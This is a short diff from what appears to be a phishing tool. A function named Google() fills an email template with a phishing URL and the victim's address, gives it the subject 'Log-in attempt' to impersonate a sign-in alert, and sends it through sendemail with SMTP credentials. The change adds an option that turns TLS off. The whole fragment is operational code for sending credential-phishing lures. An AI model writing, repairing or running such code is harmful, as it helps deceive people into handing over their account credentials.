@@ -969,7 +969,7 @@ def Google():
 	emaildata = emaildata.replace('[TIME]', time1)
 	emaildata = emaildata.replace('[PHISHING_URL]', str(phish_url))
 	emaildata = emaildata.replace('[EMAIL]', str(em+' '))
-	subprocess.call(['sendemail', '-f', from_email,'-t', str(em), '-u', 'Log-in attempt', '-m', emaildata, '-s', smtps+":"+port, '-xu', username, '-xp', password])
+	subprocess.call(['sendemail', '-f', from_email,'-t', str(em), '-u', 'Log-in attempt', '-m', emaildata, '-s', smtps+":"+port, '-o', 'tls=no', '-xu', username, '-xp', password])
 	if Phone_try == "N":
 		pass
 	elif Phone_try == "y":
